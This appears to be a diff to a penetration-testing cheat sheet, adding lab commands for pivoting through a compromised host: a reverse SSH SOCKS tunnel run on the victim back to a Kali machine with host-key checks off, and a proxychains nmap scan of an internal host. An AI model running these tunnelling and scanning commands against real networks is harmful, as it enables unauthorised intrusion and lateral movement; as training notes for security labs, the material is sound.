@@ -2290,6 +2290,10 @@ Run in victim (5985 WinRM):
 
 `sudo sshuttle -r sean@10.11.1.251 10.1.1.0/24 -v` ## Requires PW of user; Socks Proxy to entire subnetwork from kali
 
+`ssh -f -N -R 1080 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i id_rsa kali@192.168.119.137`  #Run on victim 
+
+`proxychains nmap --top-ports=20 -sT -Pn 10.1.1.68`  #Make sure "Pn" is configured when ran from kali & proxy port is in /etc/proxychains.conf file
+
 #Remote Port Forward:
 
 `ssh-keygen` # From victim machine; create keys to allow ssh connection
